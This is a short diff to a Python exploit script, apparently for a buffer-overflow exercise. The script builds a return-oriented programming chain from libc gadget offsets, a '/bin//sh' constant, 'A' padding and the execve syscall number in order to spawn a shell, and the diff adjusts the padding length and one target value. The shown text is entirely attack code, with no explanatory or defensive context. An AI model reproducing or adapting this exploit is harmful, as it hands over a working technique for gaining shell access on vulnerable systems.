@@ -20,7 +20,7 @@ d3 = 0x00
 g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
 d6 = 0x2f62696e2f2f7368 #/bin//sh
 d7 = 0x00
-retString = 0x7fffffffe154 
+retString = 0x2f62696e2f736830
 g5 = LIBC_OFFSET + 0x177452 + 0x3 #push rsp
 g6 = 0x7ffff7b9476b #syscall
 
@@ -31,7 +31,7 @@ for i in range(1,37) :
 # shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
 # shellcode += struct.pack('<p',"'/bin/sh',0")
 shellcode += struct.pack('<q', d6)
-shellcode += 'A'*(1004)
+shellcode += 'A'*(994)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
 shellcode += struct.pack('<q', g2)#pop rdx + rsi
